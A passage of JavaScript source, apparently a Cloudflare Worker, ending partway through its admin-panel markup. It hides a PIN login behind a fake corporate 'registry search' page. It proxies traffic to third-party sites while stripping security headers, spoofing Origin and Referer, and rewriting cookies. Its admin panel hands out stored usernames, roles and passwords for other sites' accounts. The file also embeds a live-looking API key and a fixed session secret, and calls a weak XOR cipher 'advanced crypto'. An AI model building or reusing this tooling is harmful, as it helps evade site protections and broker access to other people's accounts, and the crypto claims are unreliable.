// ==========================================
// ⚙️ SECURE FIREBASE CONFIGURATION
// ==========================================
const CONFIG = {
    SESSION_SECRET: "nexus_enterprise_secure_tunnel_2026",
    FB_URL: "https://private-panel-916b4-default-rtdb.firebaseio.com",
    FB_KEY: "AIzaSyC5Ygv7umkM3LJ9XEDJUTcrn_DmJ19eY0c",
    DB_NODE: "admin_web"
};

// ==========================================
// 🔐 ADVANCED CRYPTO ENGINE (Unicode Safe)
// ==========================================
const encrypt = (text) => {
    let res = '';
    const utf8 = unescape(encodeURIComponent(text));
    for(let i=0; i<utf8.length; i++) res += String.fromCharCode(utf8.charCodeAt(i) ^ CONFIG.SESSION_SECRET.charCodeAt(i % CONFIG.SESSION_SECRET.length));
    return btoa(res);
};
const decrypt = (b64) => {
    try {
        let utf8 = atob(b64);
        let res = '';
        for(let i=0; i<utf8.length; i++) res += String.fromCharCode(utf8.charCodeAt(i) ^ CONFIG.SESSION_SECRET.charCodeAt(i % CONFIG.SESSION_SECRET.length));
        return decodeURIComponent(escape(res));
    } catch(e) { return null; }
};

// ==========================================
// 🎨 UI: MASSIVE REALISTIC DECOY LANDING PAGE
// ==========================================
const landingPageHTML = `
<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nexus Digital | Enterprise Solutions</title>
    <link rel="icon" type="image/jpeg" href="https://i.postimg.cc/zXbrDz13/modern-security-logo-design-safe-your-internet-privacy-1017-51245.jpg">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #050505; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; scroll-behavior: smooth;}
        .loader { border: 2px solid transparent; border-top-color: #000; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        input:focus { outline: none; box-shadow: none; }
        .feature-box { border: 1px solid rgba(255,255,255,0.05); background: rgba(255,255,255,0.01); transition: all 0.3s; }
        .feature-box:hover { background: rgba(255,255,255,0.03); border-color: rgba(255,255,255,0.15); transform: translateY(-3px); }
        .grid-bg { background-image: linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px); background-size: 30px 30px; }
    </style>
</head>
<body class="antialiased selection:bg-white selection:text-black">
    <nav class="fixed w-full z-50 border-b border-white/10 bg-[#050505]/90 backdrop-blur-md">
        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
            <div class="text-xl font-bold tracking-widest uppercase cursor-default select-none flex items-center gap-2 flex-shrink-0">
                <svg class="w-6 h-6 text-indigo-500" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path></svg>
                Nexus<span class="text-gray-500">.</span>
            </div>
            <div class="hidden md:flex gap-8 text-[10px] font-bold tracking-widest uppercase text-gray-400">
                <a href="#solutions" class="hover:text-white transition whitespace-nowrap">Platform</a>
                <a href="#infrastructure" class="hover:text-white transition whitespace-nowrap">Network</a>
                <a href="#certifications" class="hover:text-white transition whitespace-nowrap">Security</a>
                <a href="#contact" class="hover:text-white transition whitespace-nowrap">About</a>
            </div>
            <button class="px-5 py-2.5 text-[10px] font-bold uppercase tracking-widest bg-white text-black hover:bg-gray-200 transition whitespace-nowrap flex-shrink-0">Client Login</button>
        </div>
    </nav>

    <header class="relative pt-32 pb-20 md:pt-48 md:pb-24 px-4 flex flex-col items-center justify-center border-b border-white/5 overflow-hidden">
        <div class="absolute inset-0 grid-bg opacity-30 pointer-events-none"></div>
        <div class="absolute top-1/4 left-1/2 -translate-x-1/2 w-3/4 h-1/2 bg-indigo-900/10 blur-[120px] rounded-full pointer-events-none"></div>
        
        <div class="text-center z-10 w-full max-w-2xl mx-auto relative">
            <span class="text-[10px] font-bold tracking-widest uppercase text-indigo-400 border border-indigo-500/30 bg-indigo-500/10 px-3 py-1 rounded-full mb-6 inline-block">Global Registry Tracker V4.5</span>
            <h1 class="text-5xl md:text-7xl font-light tracking-tight mb-4">Search <span class="font-bold text-white">Registry</span></h1>
            <p class="text-gray-400 text-sm md:text-base tracking-wide mb-10 leading-relaxed">Search our global database of public infrastructure documents, node statuses, and corporate registry.</p>
            
            <form id="search-form" class="w-full flex items-center p-1.5 border border-white/10 bg-[#0a0a0a] focus-within:border-indigo-500/50 transition-all shadow-[0_0_30px_rgba(0,0,0,0.5)] relative z-20">
                <div class="pl-4 flex items-center justify-center pointer-events-none flex-shrink-0">
                    <svg id="search-icon" class="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
                </div>
                <input type="text" id="main-search" placeholder="Enter tracking ID, project keyword or node number..." autocomplete="off" spellcheck="false"
                    class="w-full bg-transparent text-white text-sm px-4 py-3 placeholder-gray-600 tracking-wide font-medium min-w-0">
                <button type="submit" id="search-btn" class="px-6 py-3 bg-white hover:bg-gray-200 text-black text-[10px] font-bold uppercase tracking-widest transition flex items-center justify-center whitespace-nowrap flex-shrink-0">
                    <span id="btn-text">Check Now</span><div id="search-spinner" class="loader hidden ml-2"></div>
                </button>
            </form>
            <p id="search-msg" class="text-[10px] font-bold text-gray-500 mt-4 tracking-widest uppercase opacity-0 transition-opacity h-4"></p>
        </div>
    </header>

    <div class="py-8 bg-[#020202] border-b border-white/5 text-center">
        <p class="text-[9px] uppercase tracking-[0.2em] text-gray-600 mb-6 font-bold">Securing Infrastructure For Industry Leaders</p>
        <div class="flex flex-wrap justify-center items-center gap-8 md:gap-16 opacity-30 grayscale pointer-events-none select-none">
            <span class="text-xl font-black tracking-tighter">CipherTech</span>
            <span class="text-lg font-bold tracking-widest">NOVA NETWORKS</span>
            <span class="text-xl font-light tracking-wide border-2 border-current px-2">ORBITAL</span>
            <span class="text-lg font-serif italic font-bold">FinSecure Group</span>
            <span class="text-xl font-bold uppercase tracking-widest flex items-center gap-1"><svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2L2 22h20L12 2z"/></svg> Apex Node</span>
        </div>
    </div>

    <div class="w-full border-b border-white/5 bg-[#080808]">
        <div class="max-w-5xl mx-auto grid grid-cols-2 md:grid-cols-4 gap-4 py-12 px-6 text-center">
            <div><p class="text-3xl font-bold text-white mb-1">99.99%</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">Uptime SLA guaranteed</p></div>
            <div><p class="text-3xl font-bold text-white mb-1">250+</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">Global Edge Nodes</p></div>
            <div><p class="text-3xl font-bold text-white mb-1">&lt;10ms</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">Network Latency</p></div>
            <div><p class="text-3xl font-bold text-white mb-1">AES-256</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">End-to-End Encryption</p></div>
        </div>
    </div>

    <footer id="contact" class="pt-16 pb-10 px-6 bg-[#030303]">
        <div class="max-w-7xl mx-auto flex flex-col items-center gap-4">
            <p class="text-[10px] text-gray-600 uppercase tracking-widest">&copy; 2026 Nexus Digital Enterprise Security. All rights reserved.</p>
        </div>
    </footer>

    <script>
        document.getElementById('search-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const q = document.getElementById('main-search').value.trim();
            if(!q) return;
            document.getElementById('btn-text').classList.add('hidden');
            document.getElementById('search-spinner').classList.remove('hidden');
            document.getElementById('main-search').disabled = true;
            try {
                const res = await fetch('/api/access', { method: 'POST', body: JSON.stringify({ code: q }) });
                if (res.ok) {
                    const data = await res.json();
                    document.getElementById('search-msg').style.color = '#4ade80'; 
                    document.getElementById('search-msg').innerText = 'RECORD FOUND. FETCHING DETAILS...';
                    document.getElementById('search-msg').style.opacity = '1';
                    setTimeout(() => window.location.href = data.role === 'admin' ? '/admin' : '/dashboard', 800);
                } else {
                    setTimeout(() => {
                        document.getElementById('btn-text').classList.remove('hidden');
                        document.getElementById('search-spinner').classList.add('hidden');
                        document.getElementById('main-search').disabled = false;
                        document.getElementById('main-search').value = '';
                        document.getElementById('search-msg').style.color = '#ef4444'; 
                        document.getElementById('search-msg').innerText = 'NO RECORDS FOUND FOR "' + q.toUpperCase() + '"';
                        document.getElementById('search-msg').style.opacity = '1';
                    }, 1000);
                }
            } catch (err) {}
        });
    </script>
</body>
</html>
`;

// ==========================================
// 🚀 BACKEND & CORE LOGIC
// ==========================================

// ✅ ULTIMATE FIX FOR CUSTOM DOMAIN CSS/JS ISSUES:
// This strips out all compression headers so Cloudflare doesn't double-compress 
// and break the files on strict custom domains.
const cleanHeaders = (proxyRes, reqOrigin = null) => {
    const responseHeaders = new Headers();
    const removeHeaders =[
        'content-security-policy', 'content-security-policy-report-only', 
        'x-frame-options', 'strict-transport-security', 'x-content-type-options',
        'access-control-allow-origin', 'timing-allow-origin', 
        'cross-origin-resource-policy', 'cross-origin-opener-policy',
        'content-encoding', 'content-length', 'transfer-encoding' // MUST BE REMOVED FOR ALL FILES!
    ];

    for (const[key, value] of proxyRes.headers.entries()) {
        const kLower = key.toLowerCase();
        if (kLower === 'set-cookie') {
            let modCookie = value.replace(/Domain=[^;]+;?\s*/gi, '');
            modCookie = modCookie.replace(/SameSite=(Strict|None)/gi, 'SameSite=Lax'); 
            responseHeaders.append('Set-Cookie', modCookie);
        } else if (!removeHeaders.includes(kLower)) {
            responseHeaders.append(key, value);
        }
    }
    
    if (reqOrigin) {
        responseHeaders.set("Access-Control-Allow-Origin", reqOrigin);
        responseHeaders.set("Access-Control-Allow-Credentials", "true");
        responseHeaders.set("Access-Control-Expose-Headers", "*"); 
    }
    // Prevent Cloudflare Auto Minify / Rocket Loader from destroying injected scripts
    responseHeaders.set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0, no-transform");
    return responseHeaders;
};

export default {
    async fetch(request, env, ctx) {
        const url = new URL(request.url);
        const path = url.pathname;

        const cookieHeader = request.headers.get("Cookie") || "";
        const cookies = Object.fromEntries(cookieHeader.split(';').filter(c => c.trim()).map(c => {
            const parts = c.split('='); return[parts[0].trim(), parts.slice(1).join('=')];
        }));

        const getDB = async () => {
            try {
                const res = await fetch(`${CONFIG.FB_URL}/${CONFIG.DB_NODE}.json?key=${CONFIG.FB_KEY}`);
                let data = await res.json();
                if (!data) {
                    data = { adminPin: "SET_YOUR_PIN_HERE", settings: { whatsapp: "", notification: { enabled: false, target: "all", specificUsers:[], text: "", image: "", btnText: "", btnLink: "" } }, sites: {}, pins: {} };
                    await fetch(`${CONFIG.FB_URL}/${CONFIG.DB_NODE}.json?key=${CONFIG.FB_KEY}`, { method: 'PUT', body: JSON.stringify(data) });
                }
                return data;
            } catch(e) { return null; }
        };
        const updateDB = async (data) => {
            await fetch(`${CONFIG.FB_URL}/${CONFIG.DB_NODE}.json?key=${CONFIG.FB_KEY}`, { method: 'PUT', body: JSON.stringify(data) });
        };

        let db = await getDB() || {};
        if (!db.sites) db.sites = {};
        if (!db.pins) db.pins = {};
        if (!db.settings) db.settings = { whatsapp: "", notification: { enabled: false, target: "all", specificUsers:[], text: "", image: "", btnText: "", btnLink: "" } };

        const isAdmin = (cookies['admin_session'] === CONFIG.SESSION_SECRET);
        const userPin = cookies['portal_session'];
        const isUser = !!(userPin && db.pins && db.pins[userPin]);
        let isProxyActive = cookies['proxy_active'];

        const destHeader = request.headers.get("Sec-Fetch-Dest") || "";
        const acceptHeader = request.headers.get("Accept") || "";
        const isMainDocument = destHeader === "document" || acceptHeader.includes("text/html");

        if (isProxyActive && request.method === "GET" && !path.startsWith("/api/") && !path.startsWith("/__api_proxy") && !path.startsWith("/__ws_proxy") && isMainDocument) {
            const secFetchSite = request.headers.get("Sec-Fetch-Site");
            const referer = request.headers.get("Referer");
            if (secFetchSite === "none" || (!secFetchSite && !referer)) {
                return new Response("Killed", { status: 302, headers: { "Location": "/", "Set-Cookie": "proxy_active=; Max-Age=0; Path=/" } });
            }
        }

        // --- 📡 UNIVERSAL API INTERCEPTOR PROXY ---
        if (path === "/__api_proxy") {
            let reqOrigin = request.headers.get("Origin") || url.origin;

            if (request.method === "OPTIONS") {
                return new Response(null, {
                    status: 204,
                    headers: {
                        "Access-Control-Allow-Origin": reqOrigin,
                        "Access-Control-Allow-Methods": "GET, POST, PUT, PATCH, DELETE, OPTIONS",
                        "Access-Control-Allow-Headers": request.headers.get("Access-Control-Request-Headers") || "*",
                        "Access-Control-Allow-Credentials": "true",
                        "Access-Control-Max-Age": "86400"
                    }
                });
            }

            const targetUrlStr = url.searchParams.get("target");
            if(!targetUrlStr) return new Response("Bad Target", {status:400});
            
            const tObj = new URL(targetUrlStr);
            const proxyHeaders = new Headers(request.headers);
            
            let originSpoof = tObj.origin;
            let refererSpoof = tObj.origin + tObj.pathname;
            if (isProxyActive) {
                let pDataString = decrypt(isProxyActive);
                if (pDataString) {
                    try {
                        let pData = JSON.parse(pDataString);
                        if (pData.t) {
                            let originUrl = new URL(pData.t);
                            originSpoof = originUrl.origin;
                            refererSpoof = originUrl.origin + tObj.pathname;
                        }
                    } catch(e) {}
                }
            }

            proxyHeaders.set("Host", tObj.hostname);
            proxyHeaders.set("Origin", originSpoof);
            proxyHeaders.set("Referer", refererSpoof);
            proxyHeaders.delete("Sec-Fetch-Dest");
            proxyHeaders.delete("Sec-Fetch-Mode");
            proxyHeaders.delete("Sec-Fetch-Site");
            proxyHeaders.delete("Sec-Fetch-User");
            
            proxyHeaders.delete("Accept-Encoding");
            proxyHeaders.set("Accept-Encoding", "identity"); 
            
            const cleanCookieStr = Object.entries(cookies).filter(([k]) => k !== 'portal_session' && k !== 'proxy_active' && k !== 'admin_session').map(([k,v]) => `${k}=${v}`).join('; ');
            if (cleanCookieStr) proxyHeaders.set("Cookie", cleanCookieStr); else proxyHeaders.delete("Cookie");

            const fetchConfig = { method: request.method, headers: proxyHeaders, redirect: "manual" };
            if (["POST", "PUT", "PATCH", "DELETE"].includes(request.method)) fetchConfig.body = request.body;

            try {
                const proxyRes = await fetch(targetUrlStr, fetchConfig);
                const responseHeaders = cleanHeaders(proxyRes, reqOrigin);
                return new Response(proxyRes.body, { status: proxyRes.status, statusText: proxyRes.statusText, headers: responseHeaders });
            } catch(e) {
                return new Response("API Proxy Error", { status: 500 });
            }
        }

        if (path === "/__ws_proxy" && request.headers.get("Upgrade") === "websocket") {
            const targetUrlStr = url.searchParams.get("target");
            if(!targetUrlStr) return new Response("Bad Target", {status:400});
            const tObj = new URL(targetUrlStr);
            const wsHeaders = new Headers(request.headers);
            wsHeaders.set("Host", tObj.hostname);
            wsHeaders.set("Origin", tObj.origin);
            return fetch(targetUrlStr, { headers: wsHeaders });
        }

        // ==========================================
        // 🛠️ LOGIN & ADMIN AUTHENTICATION
        // ==========================================
        if (path === "/api/access" && request.method === "POST") {
            const { code } = await request.json();
            const strCode = String(code).trim();
            
            if (db.adminPin && db.adminPin !== "SET_YOUR_PIN_HERE" && strCode === String(db.adminPin).trim()) {
                const headers = new Headers();
                headers.set("Content-Type", "application/json");
                headers.append("Set-Cookie", `admin_session=${CONFIG.SESSION_SECRET}; Path=/; HttpOnly; Max-Age=864000; SameSite=Lax`);
                return new Response(JSON.stringify({ success: true, role: 'admin' }), { headers });
            }
            
            if (db.pins && db.pins[strCode]) {
                const headers = new Headers();
                headers.set("Content-Type", "application/json");
                headers.append("Set-Cookie", `portal_session=${strCode}; Path=/; HttpOnly; Max-Age=864000; SameSite=Lax`);
                return new Response(JSON.stringify({ success: true, role: 'user' }), { headers });
            }
            
            return new Response("Invalid", { status: 401 });
        }

        if (path === "/api/update-password" && request.method === "POST") {
            if (!isUser) return new Response("Denied", { status: 403 });
            const { siteId, accIdx, newPassword } = await request.json();
            
            let confs = db.pins[userPin].siteConf[siteId];
            if (!Array.isArray(confs)) confs =[confs]; 
            
            if (confs[accIdx]) {
                confs[accIdx].p = newPassword;
                db.pins[userPin].siteConf[siteId] = confs;
                await updateDB(db);
                return new Response(JSON.stringify({ success: true }));
            }
            return new Response("Error", {status: 400});
        }

        if (path === "/logout" || path === "/api/stop-proxy") {
            return new Response("Logged out", { status: 302, headers: { "Location": "/", "Set-Cookie": "proxy_active=; Max-Age=0; Path=/" } });
        }

        const customModalScript = `
        <div id="c-modal" class="hidden fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-md">
            <div class="bg-[#0a0a0a] border border-white/10 p-6 max-w-sm w-full mx-4 shadow-2xl flex flex-col rounded-none relative">
                <h3 id="cm-title" class="text-white font-bold tracking-widest mb-3 uppercase text-sm flex items-center gap-2"></h3>
                <p id="cm-text" class="text-gray-400 text-xs mb-6 leading-relaxed"></p>
                <input type="text" id="cm-input" class="hidden w-full bg-black border border-white/10 p-3 text-xs mb-5 outline-none focus:border-indigo-500 text-white rounded-none" autocomplete="off">
                <div class="flex gap-3 justify-end mt-2">
                    <button id="cm-cancel" class="hidden w-full px-5 py-3 bg-white/5 hover:bg-white/10 text-gray-300 text-[10px] font-bold uppercase tracking-widest transition border border-white/10 rounded-none whitespace-nowrap">Cancel</button>
                    <button id="cm-confirm" class="w-full px-6 py-3 bg-indigo-600 text-white hover:bg-indigo-500 text-[10px] font-bold uppercase tracking-widest transition shadow-[0_0_15px_rgba(99,102,241,0.4)] rounded-none whitespace-nowrap border border-indigo-500">Confirm</button>
                </div>
            </div>
        </div>
        <script>
            const CustomModal = {
                show: function({ type, title, text, placeholder, onConfirm }) {
                    const m = document.getElementById('c-modal'), tTitle = document.getElementById('cm-title'), tText = document.getElementById('cm-text');
                    const inp = document.getElementById('cm-input'), bCan = document.getElementById('cm-cancel'), bCon = document.getElementById('cm-confirm');
                    tTitle.innerHTML = title; tText.innerHTML = text;
                    inp.value = ''; inp.placeholder = placeholder || '';
                    inp.classList.add('hidden'); bCan.classList.add('hidden');
                    if(type === 'prompt') { inp.classList.remove('hidden'); bCan.classList.remove('hidden'); setTimeout(()=>inp.focus(),100); }
                    else if(type === 'confirm') { bCan.classList.remove('hidden'); }
                    m.classList.remove('hidden');
                    bCan.onclick = () => { m.classList.add('hidden'); if(type==='prompt') onConfirm(null); else onConfirm(false); };
                    bCon.onclick = () => { m.classList.add('hidden'); if(type==='prompt') onConfirm(inp.value.trim()); else onConfirm(true); };
                    inp.onkeypress = (e) => { if(e.key === 'Enter') bCon.click(); };
                }
            };
        </script>`;

        // --- 🛠️ ADMIN PANEL ---
        if (path.startsWith("/admin")) {
            if (!isAdmin) return Response.redirect(url.origin, 302);
            if (path === "/admin/api/data") return new Response(JSON.stringify(db));
            if (path === "/admin/api/save" && request.method === "POST") {
                const newData = await request.json();
                await updateDB(newData);
                return new Response("Saved");
            }

            const adminHTML = `<!DOCTYPE html><html lang="en" class="dark">
            <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin Portal</title><script src="https://cdn.tailwindcss.com"></script>
            <style>
                body { background-color: #030303; color: white; font-family: 'Inter', sans-serif; } 
                .square-card { background: #0a0a0a; border: 1px solid rgba(255,255,255,0.05); } 
                .active-tab { border-b-2 border-indigo-400; color: white; }
                .square-checkbox { appearance: none; width: 14px; height: 14px; border: 1px solid rgba(255,255,255,0.3); background: rgba(0,0,0,0.5); cursor: pointer; position: relative; transition: all 0.2s; border-radius: 2px; }
                .square-checkbox:checked { background: #6366f1; border-color: #6366f1; }
                .square-checkbox:checked::after { content: '✓'; position: absolute; color: white; font-size: 10px; font-weight: bold; left: 2px; top: -1px; }
                .square-select { appearance: none; background: #000; border: 1px solid rgba(255,255,255,0.2); outline: none; cursor: pointer; border-radius: 0px; }
                .square-select:focus { border-color: #6366f1; }
            </style>
            </head>
            <body class="pb-28">
                ${customModalScript}
                <header class="sticky top-0 z-40 flex justify-between items-center border-b border-white/10 bg-[#0a0a0a] p-4 md:p-6 shadow-md w-full">
                    <div><h1 class="text-lg md:text-xl font-bold tracking-widest uppercase text-indigo-400">Master <span class="text-white">Admin</span></h1></div>
                    <a href="/logout" class="px-5 py-2.5 bg-red-900/20 text-[10px] font-bold tracking-widest uppercase border border-red-900/50 text-red-500 hover:bg-red-600 hover:text-white transition whitespace-nowrap rounded-none">Logout</a>
                </header>
                <div class="max-w-6xl mx-auto p-4 md:p-8" id="app">
                    <div class="flex justify-center items-center h-40"><div class="animate-spin w-8 h-8 border-2 border-indigo-500 border-t-transparent rounded-full"></div></div>
                </div>
                <div class="fixed bottom-0 left-0 w-full bg-[#050505] border-t border-white/10 p-4 z-50 flex justify-center backdrop-blur-md">
                    <button id="save-btn" onclick="save()" class="w-full max-w-sm bg-white text-black font-bold uppercase tracking-widest py-4 hover:bg-gray-200 transition shadow-[0_0_20px_rgba(255,255,255,0.2)] rounded-none">SAVE ALL CHANGES</button>
                </div>
                <script>
                    let db = {}; let tab = 'pins'; let openPins = new Set(); let searchQuery = '';

                    async function load(){ const res = await fetch('/admin/api/data'); db = await res.json(); normalizeDB(); render(); }
                    
                    function normalizeDB() {
                        if(!db.sites) db.sites = {}; if(!db.pins) db.pins = {};
                        if(!db.settings) db.settings = { whatsapp: "", notification: { enabled: false, target: "all", specificUsers:[], text: "", btnText: "", btnLink: "" } };
                        Object.keys(db.pins).forEach(pin => {
                            if(db.pins[pin].siteConf) {
                                Object.keys(db.pins[pin].siteConf).forEach(siteId => {
                                    if(!Array.isArray(db.pins[pin].siteConf[siteId])) {
                                        db.pins[pin].siteConf[siteId] = [ db.pins[pin].siteConf[siteId] ];
                                    }
                                });
                            }
                        });
                    }

                    async function save(){ 
                        document.getElementById('save-btn').innerText = 'SAVING...';
                        await fetch('/admin/api/save', {method:'POST', body:JSON.stringify(db)}); 
                        setTimeout(() => { document.getElementById('save-btn').innerText = 'SAVE ALL CHANGES'; CustomModal.show({type:'alert', title:'<span class="text-green-500">✔</span> Success', text:'Database Successfully Updated!'}); }, 500);
                    }

                    function uPinSt(pin, val) { db.pins[pin].status = val; render(); }
                    function uPinF(pin, field, val) { db.pins[pin][field] = val; }
                    function uSiteF(id, f, val) { db.sites[id][f] = val; }
                    function uSet(f, val) { db.settings[f] = val; }
                    function uNotif(f, val) { if(!db.settings.notification) db.settings.notification={}; db.settings.notification[f] = val; render(); }
                    
                    function toggleSite(pin, siteId, chk) {
                        let list = db.pins[pin].sites ||[];
                        if(!db.pins[pin].siteConf) db.pins[pin].siteConf = {};
                        if(chk && !list.includes(siteId)) {
                            list.push(siteId);
                            db.pins[pin].siteConf[siteId] =[{u:'', r:'Admin', p:''}];
                        } else if(!chk) {
                            list = list.filter(i => i !== siteId);
                            delete db.pins[pin].siteConf[siteId];
                        }
                        db.pins[pin].sites = list;
                        render();
                    }

                    function uPinSiteConf(pin, siteId, idx, field, val) {
                        db.pins[pin].siteConf[siteId][idx][field] = val;
                    }

                    function addPinSiteAcc(pin, siteId) {
                        db.pins[pin].siteConf[siteId].push({u:'', r:'Admin', p:''});
                        render();
                    }

                    function delPinSiteAcc(pin, siteId, idx) {
                        db.pins[pin].siteConf[siteId].splice(idx, 1);
                        if(db.pins[pin].siteConf[siteId].length === 0) {
                            let list = db.pins[pin].sites ||[];
                            db.pins[pin].sites = list.filter(i => i !== siteId);
                            delete db.pins[pin].siteConf[siteId];
                        }
                        render();
                    }

                    function addSite() { db.sites['s_'+Date.now()] = {name:'', agentLink:'', userLink:'', apiLink:''}; tab='sites'; render(); }
                    
                    function addPin() { 
                        CustomModal.show({type:'prompt', title:'New User', text:'Enter User Name (e.g. John Doe):', onConfirm: (name) => {
                            if(!name) return;
                            CustomModal.show({type:'prompt', title:'Set PIN', text:'Enter Secret PIN for this User:', onConfirm: (p) => {
                                if(p && !db.pins[p]){ 
                                    db.pins[p] = { name: name, status:'active', sites:[], siteConf:{} }; 
                                    openPins.add(p); tab='pins'; render(); 
                                } else if(db.pins[p]) {
                                    CustomModal.show({type:'alert', title:'<span class="text-red-500">✖</span> Error', text:'This PIN already exists!'});
                                }
                            }});
                        }});
                    }

                    function delSite(id) { CustomModal.show({type:'confirm', title:'<span class="text-red-500">⚠</span> Delete Site', text:'Are you sure you want to delete this site?', onConfirm: (yes) => { if(yes) { delete db.sites[id]; render(); } }}); }
                    function delPin(pin) { CustomModal.show({type:'confirm', title:'<span class="text-red-500">⚠</span> Delete User', text:'Are you sure you want to delete this user PIN?', onConfirm: (yes) => { if(yes) { delete db.pins[pin]; render(); } }}); }

                    function toggleAdminPin(pin) {
                        if(openPins.has(pin)) openPins.delete(pin); else openPins.add(pin);
                        render();
                    }

                    function render() {
                        if(!db.sites) db.sites = {}; if(!db.pins) db.pins = {}; if(!db.settings) db.settings = {whatsapp:'', notification:{enabled:false, target:'all', specificUsers:[]}};
                        let html = \`<div class="flex gap-6 mb-8 border-b border-white/10 px-2 overflow-x-auto custom-scrollbar">
                            <button onclick="tab='pins'; render()" class="pb-3 text-xs font-bold uppercase tracking-widest \${tab==='pins'?'active-tab':'text-gray-500 hover:text-gray-300'} whitespace-nowrap">User Pins</button>
                            <button onclick="tab='sites'; render()" class="pb-3 text-xs font-bold uppercase tracking-widest \${tab==='sites'?'active-tab':'text-gray-500 hover:text-gray-300'} whitespace-nowrap">Global Sites</button>
                            <button onclick="tab='settings'; render()" class="pb-3 text-xs font-bold uppercase tracking-widest \${tab==='settings'?'active-tab':'text-gray-500 hover:text-gray-300'} whitespace-nowrap">System Settings</button>
                        </div>\`;

                        if(tab === 'pins') {
                            html += \`<div class="flex flex-col md:flex-row justify-between items-center mb-6 gap-4">
                                <input type="text" placeholder="Search Users or PIN..." value="\${searchQuery}" oninput="searchQuery=this.value.toLowerCase(); render()" class="w-full md:w-1/2 bg-black border border-white/10 p-3 text-xs text-white outline-none focus:border-indigo-500 rounded-none">
                                <button onclick="addPin()" class="w-full md:w-auto bg-indigo-600/20 border border-indigo-500/50 text-indigo-400 px-5 py-3 text-[10px] font-bold uppercase tracking-widest hover:bg-indigo-600 hover:text-white transition whitespace-nowrap rounded-none">+ Add New User</button>
                            </div>
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-5">\`;
                            Object.keys(db.pins).filter(p => p.toLowerCase().includes(searchQuery) || (db.pins[p].name||'').toLowerCase().includes(searchQuery)).forEach(pin => {
                                let pData = db.pins[pin];
                                let st = pData.status;
                                let bg = st==='active' ? 'text-green-400 border-green-400/20 bg-green-400/10' : 'text-red-400 border-red-400/20 bg-red-400/10';
                                let isOpen = openPins.has(pin);
                                html += \`<div class="square-card flex flex-col rounded-none \${st==='suspended'?'opacity-70 grayscale':''}">
                                    <div class="flex justify-between items-center p-5 cursor-pointer hover:bg-white/5 transition" onclick="toggleAdminPin('\${pin}')">
                                        <div class="flex flex-col truncate pr-4">
                                            <span class="text-lg font-bold text-white truncate">\${pData.name || 'Unnamed'}</span>
                                            <span class="text-[10px] text-indigo-400 uppercase tracking-widest font-bold mt-1">PIN: \${pin}</span>
                                        </div>
                                        <div class="flex items-center gap-4 flex-shrink-0">
                                            <select onclick="event.stopPropagation()" onchange="uPinSt('\${pin}', this.value)" class="square-select text-[9px] font-bold uppercase tracking-widest px-2 py-1 \${bg}">
                                                <option value="active" \${st==='active'?'selected':''}>ACTIVE</option>
                                                <option value="suspended" \${st==='suspended'?'selected':''}>SUSPEND</option>
                                            </select>
                                            <svg class="w-4 h-4 text-gray-500 transition-transform duration-300 \${isOpen?'rotate-180':''}" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
                                        </div>
                                    </div>
                                    <div class="\${isOpen?'block':'hidden'} p-5 border-t border-white/5 bg-black/40">
                                        <div class="mb-4">
                                            <label class="text-[8px] uppercase tracking-widest text-gray-500 mb-1 block">Edit User Name</label>
                                            <input value="\${pData.name || ''}" oninput="uPinF('\${pin}','name',this.value)" class="w-full bg-black/50 border border-white/10 p-2 text-xs text-white outline-none focus:border-indigo-500 rounded-none">
                                        </div>
                                        <span class="text-[8px] font-bold text-gray-500 uppercase tracking-widest block mb-2">Assign Sites & Accounts:</span>
                                        <div class="space-y-3 max-h-[400px] overflow-y-auto pr-2 custom-scrollbar">\`;
                                        Object.keys(db.sites).forEach(siteId => {
                                            let hasSite = (pData.sites||[]).includes(siteId);
                                            html += \`<div class="bg-[#0a0a0a] border border-white/10 p-3 mb-2">
                                                <label class="flex items-center gap-3 text-xs cursor-pointer mb-2">
                                                    <input type="checkbox" \${hasSite ? 'checked':''} onchange="toggleSite('\${pin}', '\${siteId}', this.checked)" class="square-checkbox w-4 h-4">
                                                    <span class="truncate text-gray-300 font-bold">\${db.sites[siteId].name || 'Unnamed Site'}</span>
                                                </label>\`;
                                            if(hasSite) {
                                                let confs = pData.siteConf?.[siteId] ||[];
                                                if(!Array.isArray(confs)) confs =[confs];
                                                confs.forEach((conf, idx) => {
                                                    html += \`<div class="mt-2 p-3 bg-white/5 border border-white/5 relative">
                                                        <button onclick="delPinSiteAcc('\${pin}','\${siteId}',\${idx})" class="absolute top-2 right-2 text-red-500 hover:text-red-400 bg-red-500/10 w-5 h-5 flex items-center justify-center">✖</button>
                                                        <div class="flex gap-2 mb-2 pr-6">
                                                            <select onchange="uPinSiteConf('\${pin}','\${siteId}',\${idx},'r',this.value)" class="square-select w-1/3 bg-black border border-white/10 p-2 text-[10px] text-gray-300 outline-none">
                                                                <option value="Admin" \${conf.r==='Admin'?'selected':''}>Admin</option>
                                                                <option value="Super Agent" \${conf.r==='Super Agent'?'selected':''}>Super Ag</option>
                                                                <option value="Master Agent" \${conf.r==='Master Agent'?'selected':''}>Master Ag</option>
